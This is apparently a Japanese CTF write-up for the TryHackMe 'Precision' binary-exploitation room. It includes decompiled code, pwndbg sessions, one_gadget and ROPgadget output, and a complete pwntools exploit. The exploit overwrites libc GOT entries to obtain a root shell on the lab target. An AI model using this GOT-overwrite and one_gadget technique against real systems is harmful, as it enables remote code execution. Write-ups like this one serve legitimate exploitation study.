# Precision CTF

https://tryhackme.com/room/hfb1precision

## 静的解析

アドレスはランダム。

```sh
$ pwn checksec ./precision                                
[*] '/home/kali/ctf/tmp/precision'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Dockerfile

```docker
FROM ubuntu:22.04
RUN apt update && apt install socat -y
RUN groupadd -r ctf && useradd -r -g ctf ctf
WORKDIR /home/ctf
EXPOSE 9004

COPY flag.txt .
COPY precision .
COPY libc.so.6 .
COPY ld-linux-x86-64.so.2 .
RUN chmod +x precision
RUN chmod +x libc.so.6
RUN chmod +x ld-linux-x86-64.so.2


CMD ["socat", "tcp-l:9004,reuseaddr,fork", "EXEC:./precision"]
```

```c
void main(void)
{
  void *pvVar1;
  
  setup();
  printf("\nCoordinates: %p\n",stdout);
  pvVar1 = (void *)getint();
  write(1,"\nFirst chance: ",0xf);
  fread(pvVar1,8,1,stdin);
  pvVar1 = (void *)getint();
  write(1,"\nSecond chance: ",0x10);
  fread(pvVar1,8,1,stdin);
  perror("!");
                    /* WARNING: Subroutine does not return */
  _exit(0x539);
}

void getint(void)
{
  long in_FS_OFFSET;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  write(1,&DAT_00102004,4);
  fgets(local_58,0x40,stdin);
  strtoul(local_58,(char **)0x0,10);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

1. まずstdoutのアドレスを出力している。FILE構造体のインスタンスアドレスと思われる。
2. int値を入力させ、それをfreadの書き込み先アドレスとして使用している。
3. 2 をもう一回繰り返す。
4. エラー出力してプロセス修了。


## 動的解析

全部１を入力してみると、最終的にBad Addressというエラー表示される。  
これは、fread の書き込み先アドレスが不正ということで発生していると思われる。

```sh
$ ./precision

Coordinates: 0x7f335281a780

>> 1

First chance: 1

>> 1

Second chance: 1
!: Bad address
```

## 方針

- stdoutのアドレス値を表示していることで、libcのベースアドレスは分かると想定。
- getintで指定する任意のアドレスに、freadで8バイトの任意のバイトを書き込むことが可能。
- 2回繰り返すのをどう生かせるのか不明。

ここから先が全く分からないので[ウォークスルー](https://www.ztz0.com/writeups/2025/tryhackme-hackfinity-battle/pwn/precision/)を読む。

GOTを表示

ウォークスルーでは __strlen_avx2、__mempcpy_avx_unaligned_erms でブレークしているが、手元の環境では異なる表示になった。（CPUの世代による違いらしい）

```sh
pwndbg> b *main
pwndbg> r
pwndbg> got -p /home/kali/ctf/tmp/libc.so.6
Filtering by lib/objfile path: /home/kali/ctf/tmp/libc.so.6
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/kali/ctf/tmp/libc.so.6:
GOT protection: Partial RELRO | Found 54 GOT entries passing the filter
[0x7ffff7e19018] *ABS*+0x0 -> 0x7ffff7db3e80 (__strnlen_evex) ◂— endbr64
[0x7ffff7e19020] *ABS*+0x0 -> 0x7ffff7dafca0 (__rawmemchr_evex) ◂— endbr64
[0x7ffff7e19028] realloc -> 0x7ffff7c28030 ◂— endbr64
[0x7ffff7e19030] *ABS*+0x0 -> 0x7ffff7d9b930 (__strncasecmp_avx) ◂— endbr64
[0x7ffff7e19038] _dl_exception_create@GLIBC_PRIVATE -> 0x7ffff7c28050 ◂— endbr64
[0x7ffff7e19040] *ABS*+0x0 -> 0x7ffff7da6900 (__mempcpy_avx512_unaligned_erms) ◂— endbr64
[0x7ffff7e19048] *ABS*+0x0 -> 0x7ffff7da7110 (__wmemset_avx512_unaligned) ◂— endbr64
[0x7ffff7e19050] calloc -> 0x7ffff7c28080 ◂— endbr64
[0x7ffff7e19058] *ABS*+0x0 -> 0x7ffff7d98990 (__strspn_sse42) ◂— endbr64
[0x7ffff7e19060] *ABS*+0x0 -> 0x7ffff7dae680 (__memchr_evex) ◂— endbr64
[0x7ffff7e19068] *ABS*+0x0 -> 0x7ffff7da6940 (__memmove_avx512_unaligned_erms) ◂— endbr64
[0x7ffff7e19070] *ABS*+0x0 -> 0x7ffff7db5700 (__wmemchr_evex) ◂— endbr64
[0x7ffff7e19078] *ABS*+0x0 -> 0x7ffff7dafe20 (__stpcpy_evex) ◂— endbr64
[0x7ffff7e19080] *ABS*+0x0 -> 0x7ffff7db5a00 (__wmemcmp_evex_movbe) ◂— endbr64
[0x7ffff7e19088] _dl_find_dso_for_object@GLIBC_PRIVATE -> 0x7ffff7c280f0 ◂— endbr64
[0x7ffff7e19090] *ABS*+0x0 -> 0x7ffff7db3430 (__strncpy_evex) ◂— endbr64
[0x7ffff7e19098] *ABS*+0x0 -> 0x7ffff7db2220 (__strlen_evex) ◂— endbr64
[0x7ffff7e190a0] *ABS*+0x0 -> 0x7ffff7d9a2c4 (__strcasecmp_l_avx) ◂— endbr64
[0x7ffff7e190a8] *ABS*+0x0 -> 0x7ffff7db1dd0 (__strcpy_evex) ◂— endbr64
[0x7ffff7e190b0] *ABS*+0x0 -> 0x7ffff7db4340 (__wcschr_evex) ◂— endbr64
[0x7ffff7e190b8] *ABS*+0x0 -> 0x7ffff7db1700 (__strchrnul_evex) ◂— endbr64
[0x7ffff7e190c0] *ABS*+0x0 -> 0x7ffff7daf700 (__memrchr_evex) ◂— endbr64
[0x7ffff7e190c8] _dl_deallocate_tls@GLIBC_PRIVATE -> 0x7ffff7c28170 ◂— endbr64
[0x7ffff7e190d0] __tls_get_addr@GLIBC_2.3 -> 0x7ffff7c28180 ◂— endbr64
[0x7ffff7e190d8] *ABS*+0x0 -> 0x7ffff7da7110 (__wmemset_avx512_unaligned) ◂— endbr64
[0x7ffff7e190e0] *ABS*+0x0 -> 0x7ffff7dae980 (__memcmp_evex_movbe) ◂— endbr64
[0x7ffff7e190e8] *ABS*+0x0 -> 0x7ffff7d9b944 (__strncasecmp_l_avx) ◂— endbr64
[0x7ffff7e190f0] _dl_fatal_printf@GLIBC_PRIVATE -> 0x7ffff7c281c0 ◂— endbr64
[0x7ffff7e190f8] *ABS*+0x0 -> 0x7ffff7db0d00 (__strcat_evex) ◂— endbr64
[0x7ffff7e19100] *ABS*+0x0 -> 0x7ffff7d927a0 (__wcscpy_ssse3) ◂— endbr64
[0x7ffff7e19108] *ABS*+0x0 -> 0x7ffff7d98730 (__strcspn_sse42) ◂— endbr64
[0x7ffff7e19110] *ABS*+0x0 -> 0x7ffff7d9a2b0 (__strcasecmp_avx) ◂— endbr64
[0x7ffff7e19118] *ABS*+0x0 -> 0x7ffff7db2ec0 (__strncmp_evex) ◂— endbr64
[0x7ffff7e19120] *ABS*+0x0 -> 0x7ffff7db5700 (__wmemchr_evex) ◂— endbr64
[0x7ffff7e19128] *ABS*+0x0 -> 0x7ffff7db0270 (__stpncpy_evex) ◂— endbr64
[0x7ffff7e19130] *ABS*+0x0 -> 0x7ffff7db45c0 (__wcscmp_evex) ◂— endbr64
[0x7ffff7e19138] _dl_audit_symbind_alt@GLIBC_PRIVATE -> 0x7ffff7c28250 ◂— endbr64
[0x7ffff7e19140] *ABS*+0x0 -> 0x7ffff7da6940 (__memmove_avx512_unaligned_erms) ◂— endbr64
[0x7ffff7e19148] *ABS*+0x0 -> 0x7ffff7db4140 (__strrchr_evex) ◂— endbr64
[0x7ffff7e19150] *ABS*+0x0 -> 0x7ffff7db1460 (__strchr_evex) ◂— endbr64
[0x7ffff7e19158] *ABS*+0x0 -> 0x7ffff7db4340 (__wcschr_evex) ◂— endbr64
[0x7ffff7e19160] *ABS*+0x0 -> 0x7ffff7da6940 (__memmove_avx512_unaligned_erms) ◂— endbr64
[0x7ffff7e19168] _dl_rtld_di_serinfo@GLIBC_PRIVATE -> 0x7ffff7c282b0 ◂— endbr64
[0x7ffff7e19170] _dl_allocate_tls@GLIBC_PRIVATE -> 0x7ffff7c282c0 ◂— endbr64
[0x7ffff7e19178] __tunable_get_val@GLIBC_PRIVATE -> 0x7ffff7fdadd0 (__tunable_get_val) ◂— endbr64
[0x7ffff7e19180] *ABS*+0x0 -> 0x7ffff7db4a80 (__wcslen_evex) ◂— endbr64
[0x7ffff7e19188] *ABS*+0x0 -> 0x7ffff7da71c0 (__memset_avx512_unaligned_erms) ◂— endbr64
[0x7ffff7e19190] *ABS*+0x0 -> 0x7ffff7db51e0 (__wcsnlen_evex) ◂— endbr64
[0x7ffff7e19198] *ABS*+0x0 -> 0x7ffff7db1960 (__strcmp_evex) ◂— endbr64
[0x7ffff7e191a0] _dl_allocate_tls_init@GLIBC_PRIVATE -> 0x7ffff7c28320 ◂— endbr64
[0x7ffff7e191a8] __nptl_change_stack_perm@GLIBC_PRIVATE -> 0x7ffff7c28330 ◂— endbr64
[0x7ffff7e191b0] *ABS*+0x0 -> 0x7ffff7d98870 (__strpbrk_sse42) ◂— endbr64
[0x7ffff7e191b8] _dl_audit_preinit@GLIBC_PRIVATE -> 0x7ffff7fde680 (_dl_audit_preinit) ◂— endbr64
[0x7ffff7e191c0] *ABS*+0x0 -> 0x7ffff7db3e80 (__strnlen_evex) ◂— endbr64
```

一通り入力し終わった後、__strlen_evex でブレークされる。

```sh
Breakpoint 4, __strlen_evex () at ../sysdeps/x86_64/multiarch/strlen-evex.S:55
⚠️ warning: 55   ../sysdeps/x86_64/multiarch/strlen-evex.S: No such file or directory
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────
*RAX  0x7ffff7dda1d7 (_nl_C_name) ◂— 0x636d656d5f5f0043 /* 'C' */
*RBX  0x7ffff7dda1d7 (_nl_C_name) ◂— 0x636d656d5f5f0043 /* 'C' */
*RCX  0
*RDX  0x33
*RDI  0x7ffff7dd850a (_libc_intl_domainname) ◂— 0x534f50006362696c /* 'libc' */
*RSI  0
*R8   0x7ffff7e1ad20 (tree_lock) ◂— 0
*R9   0
*R10  0xfffffffffffff000
*R11  0x7ffff7e19ce0 (main_arena+96) —▸ 0x55555555d470 —▸ 0x7ffff7e160c0 (__GI__IO_wfile_jumps) ◂— 0
*R12  0
*R13  0x7ffff7dd850a (_libc_intl_domainname) ◂— 0x534f50006362696c /* 'libc' */
*R14  0x7ffff7dd89aa ◂— 'Bad address'
*R15  0x7ffff7dbd493 (_nl_category_names+51) ◂— 'LC_MESSAGES'
*RBP  0x7fffffffd810 —▸ 0x55555555d2a0 ◂— 0xfbad2480
*RSP  0x7fffffffd708 —▸ 0x7ffff7c3b6f4 (__dcigettext+436) ◂— mov rdi, r15
*RIP  0x7ffff7db2220 (__strlen_evex) ◂— endbr64
────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────
b► 0x7ffff7db2220 <__strlen_evex>       endbr64
   0x7ffff7db2224 <__strlen_evex+4>     mov    eax, edi                EAX => 0xf7dd850a
   0x7ffff7db2226 <__strlen_evex+6>     vpxorq xmm16, xmm16, xmm16
   0x7ffff7db222c <__strlen_evex+12>    and    eax, 0xfff              EAX => 0xf7dd850a & 0xfff
   0x7ffff7db2231 <__strlen_evex+17>    cmp    eax, 0xfe0
   0x7ffff7db2236 <__strlen_evex+22>  ? ja     __strlen_evex+336           <__strlen_evex+336>
 
   0x7ffff7db223c <__strlen_evex+28>    vpcmpeqb k0, ymm16, ymmword ptr [rdi]
   0x7ffff7db2243 <__strlen_evex+35>    kmovd  eax, k0
   0x7ffff7db2247 <__strlen_evex+39>    test   eax, eax
   0x7ffff7db2249 <__strlen_evex+41>  ? je     __strlen_evex+128           <__strlen_evex+128>
 
   0x7ffff7db224b <__strlen_evex+43>    tzcnt  eax, eax
─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd708 —▸ 0x7ffff7c3b6f4 (__dcigettext+436) ◂— mov rdi, r15
01:0008│-100 0x7fffffffd710 ◂— 0xffffd7a4
02:0010│-0f8 0x7fffffffd718 ◂— 0
03:0018│-0f0 0x7fffffffd720 —▸ 0x7ffff7dda1d7 (_nl_C_name) ◂— 0x636d656d5f5f0043 /* 'C' */
04:0020│-0e8 0x7fffffffd728 ◂— 0
05:0028│-0e0 0x7fffffffd730 —▸ 0x7fffffffd8f8 —▸ 0x7ffff7fd01d4 ◂— test eax, eax
06:0030│-0d8 0x7fffffffd738 —▸ 0x7ffff7fc3ba8 ◂— '_dl_catch_error'
07:0038│-0d0 0x7fffffffd740 ◂— 0
───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────
 ► 0 0x7ffff7db2220 __strlen_evex
   1 0x7ffff7c3b6f4 __dcigettext+436
   2 0x7ffff7c3a903
   3 0x7ffff7ca86d2 strerror_r+50
   4 0x7ffff7c60e95 perror_internal+69
   5 0x7ffff7c60f82 perror+146
   6 0x5555555553f7 main+209
   7 0x7ffff7c29d90 __libc_start_call_main+128
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

ガジェットの１つに注目。strlenのブレーク時、rsi=0 だが、rdx=0x33 となっているので、rdx を0にする必要がある。

```sh
$ one_gadget -l1 ./libc.so.6
...
0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
...
```

rdx に r12 を入れるコードを検索する。ブレーク時に r12 が 0 であることがわかっているので成立している。

```sh
$ ROPgadget --binary libc.so.6 | grep "mov rdx, r12"
0x00000000000ac72c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rdx, r12 ; jmp 0xac67a
0x0000000000159b49 : add byte ptr [rax], al ; mov rdx, r12 ; jmp 0x159b5b
0x000000000008b44e : add byte ptr [rax], al ; mov rdx, r12 ; jmp 0x8b3e1
0x00000000000ac72e : add byte ptr [rax], al ; mov rdx, r12 ; jmp 0xac67a
0x000000000008b44d : add byte ptr [rax], r8b ; mov rdx, r12 ; jmp 0x8b3e1
0x0000000000073cb6 : add byte ptr [rcx + rcx*4 - 9], cl ; mov rdx, r12 ; call 0x80720
0x0000000000159b47 : cmp eax, dword ptr [rbx] ; add byte ptr [rax], al ; mov rdx, r12 ; jmp 0x159b5b
0x000000000015f82e : jae 0x15f840 ; mov rdx, r12 ; mov rdi, r13 ; call qword ptr [rax + 0x10]
0x000000000015f86c : jae 0x15f87e ; mov rdx, r12 ; mov rdi, r13 ; call qword ptr [rax + 0x20]
0x000000000007232d : jbe 0x72388 ; movsxd r12, r12d ; mov rdx, r12 ; call qword ptr [r13 + 0x38]
0x000000000008a2fd : jbe 0x8a358 ; mov rdx, r12 ; mov rsi, r13 ; call qword ptr [r14 + 0x38]
0x0000000000157858 : je 0x157890 ; mov rdx, r12 ; jmp 0x157875
0x0000000000157f30 : je 0x157f74 ; mov rdx, r12 ; jmp 0x157f55
0x0000000000159b45 : je 0x159e86 ; mov rdx, r12 ; jmp 0x159b5b
0x000000000015c848 : je 0x15c880 ; mov rdx, r12 ; jmp 0x15c865
0x0000000000157854 : jne 0x157840 ; test dl, dl ; je 0x157890 ; mov rdx, r12 ; jmp 0x157875
0x0000000000157f2c : jne 0x157f18 ; test dl, dl ; je 0x157f74 ; mov rdx, r12 ; jmp 0x157f55
0x000000000015c844 : jne 0x15c830 ; test dl, dl ; je 0x15c880 ; mov rdx, r12 ; jmp 0x15c865
0x00000000000a8146 : mov eax, ebp ; mov rdx, r12 ; pop r12 ; pop r13 ; ret
0x00000000001333a3 : mov ebx, dword ptr [rbp - 0xb8] ; mov rdx, r12 ; jmp 0x133616
0x0000000000073cb8 : mov edi, esi ; mov rdx, r12 ; call 0x80720
0x000000000015f82d : mov esi, dword ptr [rbx + 0x10] ; mov rdx, r12 ; mov rdi, r13 ; call qword ptr [rax + 0x10]
0x000000000015f86b : mov esi, dword ptr [rbx + 0x10] ; mov rdx, r12 ; mov rdi, r13 ; call qword ptr [rax + 0x20]
0x0000000000073cb7 : mov rdi, r14 ; mov rdx, r12 ; call 0x80720
0x0000000000073cba : mov rdx, r12 ; call 0x80720
0x000000000011d945 : mov rdx, r12 ; call 0x8a370
0x0000000000072332 : mov rdx, r12 ; call qword ptr [r13 + 0x38]
0x00000000001333a9 : mov rdx, r12 ; jmp 0x133616
0x000000000015785a : mov rdx, r12 ; jmp 0x157875
0x0000000000157f32 : mov rdx, r12 ; jmp 0x157f55
0x0000000000159b4b : mov rdx, r12 ; jmp 0x159b5b
0x000000000015c84a : mov rdx, r12 ; jmp 0x15c865
0x000000000008b450 : mov rdx, r12 ; jmp 0x8b3e1
0x00000000000a8ee4 : mov rdx, r12 ; jmp 0xa8e9d
0x00000000000ac730 : mov rdx, r12 ; jmp 0xac67a
0x0000000000133a79 : mov rdx, r12 ; mov dword ptr [rsi], eax ; jmp 0x133616
0x000000000009f1f8 : mov rdx, r12 ; mov eax, 0x81 ; syscall
0x000000000015f830 : mov rdx, r12 ; mov rdi, r13 ; call qword ptr [rax + 0x10]
0x000000000015f86e : mov rdx, r12 ; mov rdi, r13 ; call qword ptr [rax + 0x20]
0x000000000008a2ff : mov rdx, r12 ; mov rsi, r13 ; call qword ptr [r14 + 0x38]
0x0000000000072dbe : mov rdx, r12 ; mov rsi, r13 ; mov rdi, r14 ; call qword ptr [rcx + 0x38]
0x000000000008004a : mov rdx, r12 ; mov rsi, r14 ; mov rdi, rbx ; call qword ptr [r15 + 0x38]
0x000000000007fb10 : mov rdx, r12 ; mov rsi, rbp ; mov rdi, rbx ; call qword ptr [r13 + 0x38]
0x00000000000815c9 : mov rdx, r12 ; mov rsi, rbp ; mov rdi, rbx ; call qword ptr [r13 + 0x58]
0x00000000000815f3 : mov rdx, r12 ; mov rsi, rbp ; mov rdi, rbx ; call qword ptr [rax + 0x58]
0x00000000001609a0 : mov rdx, r12 ; mov rsi, rbp ; mov rdi, rbx ; call qword ptr [rsp + 0x20]
0x0000000000132f2a : mov rdx, r12 ; movups xmmword ptr [rbp - 0x78], xmm3 ; call rax
0x00000000001331a2 : mov rdx, r12 ; movups xmmword ptr [rbp - 0x78], xmm4 ; call rax
0x000000000013365a : mov rdx, r12 ; movups xmmword ptr [rbp - 0x78], xmm6 ; call rax
0x000000000013372c : mov rdx, r12 ; movups xmmword ptr [rbp - 0x78], xmm7 ; call rax
0x00000000000a8148 : mov rdx, r12 ; pop r12 ; pop r13 ; ret
0x0000000000084f8c : mov rdx, r12 ; sub rax, r12 ; neg rdx ; jmp 0x84e0d
0x0000000000176df7 : mov rdx, r12 ; sub rdx, rsi ; call 0x283e0
0x00000000000442d1 : mov rdx, r12 ; xor esi, esi ; mov r9, rdi ; jmp 0x43e44
0x000000000007232f : movsxd r12, r12d ; mov rdx, r12 ; call qword ptr [r13 + 0x38]
0x000000000008b44b : nop dword ptr [rax + rax] ; mov rdx, r12 ; jmp 0x8b3e1
0x000000000008b44a : nop word ptr [rax + rax] ; mov rdx, r12 ; jmp 0x8b3e1
0x000000000008a2fe : pop rcx ; mov rdx, r12 ; mov rsi, r13 ; call qword ptr [r14 + 0x38]
0x000000000007232e : pop rcx ; movsxd r12, r12d ; mov rdx, r12 ; call qword ptr [r13 + 0x38]
0x000000000011d941 : sub edx, eax ; sub esi, edx ; mov rdx, r12 ; call 0x8a370
0x000000000011d943 : sub esi, edx ; mov rdx, r12 ; call 0x8a370
0x00000000000ac72a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov rdx, r12 ; jmp 0xac67a
0x0000000000157856 : test dl, dl ; je 0x157890 ; mov rdx, r12 ; jmp 0x157875
0x0000000000157f2e : test dl, dl ; je 0x157f74 ; mov rdx, r12 ; jmp 0x157f55
0x000000000015c846 : test dl, dl ; je 0x15c880 ; mov rdx, r12 ; jmp 0x15c865
```

ウォークスルーでは下記の行に注目しており、0x283e0 は __mempcpy_avx_unaligned_erms を呼び出していると書かかれている。

```sh
0x0000000000176df7 : mov rdx, r12 ; sub rdx, rsi ; call 0x283e0
```

vmmap

```sh
pwndbg> vmmap libc
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
               Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
      0x55555555d000     0x55555557e000 rw-p    21000       0 [heap]
►     0x7ffff7c00000     0x7ffff7c28000 r--p    28000       0 libc.so.6
►     0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000   28000 libc.so.6
►     0x7ffff7dbd000     0x7ffff7e15000 r--p    58000  1bd000 libc.so.6
►     0x7ffff7e15000     0x7ffff7e19000 r--p     4000  214000 libc.so.6
►     0x7ffff7e19000     0x7ffff7e1b000 rw-p     2000  218000 libc.so.6
      0x7ffff7e1b000     0x7ffff7e28000 rw-p     d000       0 [anon_7ffff7e1b]
```

この場合、0x7ffff7c00000 が libc のベースアドレスとなり、ガジェットの実際のアドレスは 0x7ffff7c00000 + 0x176df7 と計算できる。

話を戻して 0x283e0 のアドレスを調べると、手元のPCでは、 0x283e0 が __mempcpy_avx_unaligned_erms を指していると分からなかった。

しかし、何の関数かは分からないが、0x7ffff7e19040 にジャンプしていることは分かる。

```sh
pwndbg> x/3i 0x7ffff7c00000 + 0x283e0
   0x7ffff7c283e0 <*ABS*+0xa9850@plt>:  endbr64
   0x7ffff7c283e4 <*ABS*+0xa9850@plt+4>:
    bnd jmp QWORD PTR [rip+0x1f0c55]        # 0x7ffff7e19040 <*ABS*@got.plt>
   0x7ffff7c283eb <*ABS*+0xa9850@plt+11>:       nop    DWORD PTR [rax+rax*1+0x0]
```

[ウォークスルーのエクスプロイト](https://www.ztz0.com/writeups/2025/tryhackme-hackfinity-battle/pwn/precision/) を自分の環境で取得できたアドレスに変更したコード。

```python
from pwn import *

binary = './precision'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
#r = process(binary)
r = remote('10.145.131.95', 9004)
# r = remote('127.0.0.1', 9004)
libc = ELF('./libc.so.6')

# gdb.attach(r, '''
#         c
#             ''')

r.recvuntil(b'Coordinates: ')
leak = r.recvline().strip()
leak = int(leak, 16)
log.info(f'Leak: {hex(leak)}')
libc_base = leak - libc.symbols['_IO_2_1_stdout_']
log.info(f'Libc base: {hex(libc_base)}')

libc.address = libc_base

# libc_base はリークしたアドレスから計算済みとする

# 1つ目: strlen の GOT (0x7ffff7e19098)
strlen_got  = libc_base + (0x7ffff7e19098 - 0x7ffff7c00000)

# 2つ目: call 0x283e0 が参照する GOT (0x7ffff7e19040)
jump_got = libc_base + (0x7ffff7e19040 - 0x7ffff7c00000)

# strlen の GOT をガジェット (0x176df7) に書き換える
r.sendlineafter(b'>> ', str(strlen_got).encode())
r.send(p64(libc_base + 0x176df7))

# call 0x283e0 が参照する GOT を One Gadget (0xebcf8) に書き換える
r.sendlineafter(b'>> ', str(jump_got).encode())
r.send(p64(libc_base + 0xebcf8))

r.interactive()
```

実行

```sh
[DEBUG] Received 0x27 bytes:
    b'uid=0(root) gid=0(root) groups=0(root)\n'
uid=0(root) gid=0(root) groups=0(root)
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x32 bytes:
    b'flag.txt\n'
    b'ld-linux-x86-64.so.2\n'
    b'libc.so.6\n'
    b'precision\n'
flag.txt
ld-linux-x86-64.so.2
libc.so.6
precision
$ cat flag.txt
```

## 振り返り

- 難しい。いくら考えても自力では解けなかったと思う。とても良い勉強にはなった。
- stdout のアドレスはシンボルとして取得できる。
- PLT は GOT への jmp 命令が入っているということを理解した。（今さら）
- GOTは関数の物理アドレスが入っており、GOTの内容を書き換えられるということは、任意のガジェットへジャンプさせられるということ。（今さら）
- 2回チャンスが与えられるということは、1回目のチャンスで本命ガジェット（シェル起動）の前提条件をクリアするガジェットを実行できるということ。今回の場合、1回目のチャンスで前提条件のレジスタを0にした。

## Tags

#tags:pwn #tags:one_gadget #tags:ROPgadget
